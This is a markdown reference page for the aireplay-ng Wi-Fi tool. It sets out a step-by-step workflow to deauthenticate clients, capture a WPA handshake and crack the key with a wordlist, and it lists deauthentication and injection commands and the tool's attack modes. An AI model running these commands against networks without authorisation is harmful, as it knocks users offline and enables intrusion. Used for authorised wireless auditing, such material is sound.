# aireplay-ng

Used to inject/replay frames. The primary function is to generate traffic for later use in aircrack-ng for cracking the WEP and WPA-PSK keys. For example, looking for the four-way handshake message during a deauthentication injection tests. Make sure that both the BSSID and CHANNEL are set correctly prior to injections.

Here's the normal workflow.

* Run [setup](../setup.md) first

```bash

sudo airmon-ng -c $CHANNEL $ADAPTER

# Terminal 1
sudo airodump-ng -c $CHANNEL --bssid $BSSID --output-format pcap -w $TAG $INTERFACE

# Terminal 2
sudo aireplay-ng --deauth 7 -a $BSSID -c $CLIENT $INTERFACE

# Wait for found handshake message from airodump-ng then stop everything

# Crack the key
sudo aircrack-ng -w $WORDLIST -b $BSSID -e $SSID $PCAP
```

## Commands

```bash
# Test if injection works for given interface
sudo aireplay-ng --test $INTERFACE

# Test injection between two interfaces (if two exists)
sudo aireplay-ng --test -i $INTERFACE2 $INTERFACE

# Test injection in a specific AP
sudo aireplay-ng -e $SSID -a $BSSID $INTERFACE

# Test injection in a specific AP without expecting to receive probes
sudo aireplay-ng -e $SSID -a $BSSID -D $INTERFACE

# Deauthenticate a specific client connected to an AP
sudo aireplay-ng --deauth 7 -a $BSSID -c $CLIENT $INTERFACE

# Deauthenticate ALL clients connected to an AP
sudo aireplay-ng --deauth 7 -a $BSSID $INTERFACE
```

## Attack Modes

```bash
aireplay-ng --help

Attack modes (numbers can still be used):

    --deauth      count : deauthenticate 1 or all stations (-0)
    --fakeauth    delay : fake authentication with AP (-1)
    --interactive       : interactive frame selection (-2)
    --arpreplay         : standard ARP-request replay (-3)
    --chopchop          : decrypt/chopchop WEP packet (-4)
    --fragment          : generates valid keystream   (-5)
    --caffe-latte       : query a client for new IVs  (-6)
    --cfrag             : fragments against a client  (-7)
    --migmode           : attacks WPA migration mode  (-8)
    --test              : tests injection and quality (-9)
```

## References

* [Aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)
